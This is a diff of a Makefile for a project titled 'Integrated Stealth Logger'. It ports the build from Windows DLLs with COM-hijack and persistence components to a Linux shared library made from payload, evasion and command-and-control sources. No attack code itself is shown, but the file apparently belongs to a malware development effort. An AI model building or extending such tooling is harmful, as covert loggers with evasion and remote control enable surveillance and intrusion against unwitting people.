@@ -1,40 +1,32 @@
+# Integrated Stealth Logger Makefile
 CC = gcc
-CXX = g++
-CFLAGS = -Wall -Wextra -O2 -fPIC
-CXXFLAGS = -Wall -Wextra -O2 -fPIC
-LDFLAGS = -shared -ladvapi32 -lws2_32
+CFLAGS = -Wall -Wextra -O2 -fPIC -std=c99
+LDFLAGS = -shared -lpthread
 
-all: payload.dll sentinel.dll test_persistence.exe
+# Targets
+all: libpayload.so main
 
-payload.dll: payload.o evasion.o c2_communication_fixed.o main.o com_hijack.o
+libpayload.so: payload.o evasion.o c2_communication_fixed.o
 	$(CC) $(LDFLAGS) -o $@ $^
 
-sentinel.dll: sentinel_dll.o
-	$(CXX) $(LDFLAGS) -o $@ $^
+main: main.o
+	$(CC) $(CFLAGS) -o $@ $^
 
-test_persistence.exe: test_persistence.o
-	$(CC) -o $@ $^ -luser32 -lshell32 -lcomctl32 -lcomdlg32 -ladvapi32 -lkernel32 -luser32 -lgdi32 -lwinspool -lcomdlg32 -ladvapi32 -lshell32 -lole32 -loleaut32 -luuid -lodbc32 -lodbccp32
-
+# Object files
 payload.o: payload.c payload.h payload_config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-evasion.o: evasion.c evasion.h
+evasion.o: evasion.c evasion.h config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
 c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-com_hijack.o: com_hijack.c com_hijack.h com_hijack_config.h
+main.o: main.c payload.h evasion.h c2_communication_fixed.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-main.o: main.c payload.h evasion.h c2_communication_fixed.h com_hijack.h com_hijack_config.h
-	$(CC) $(CFLAGS) -c -o $@ $<
-
-sentinel_dll.o: sentinel_dll.cpp sentinel_dll.h
-	$(CXX) $(CXXFLAGS) -c -o $@ $<
-
-test_persistence.o: test_persistence.c
-	$(CC) $(CFLAGS) -c -o $@ $<
-
+# Clean
 clean:
-	rm -f *.o payload.dll sentinel.dll test_persistence.exe
+	rm -f *.o libpayload.so main
+
+.PHONY: all clean
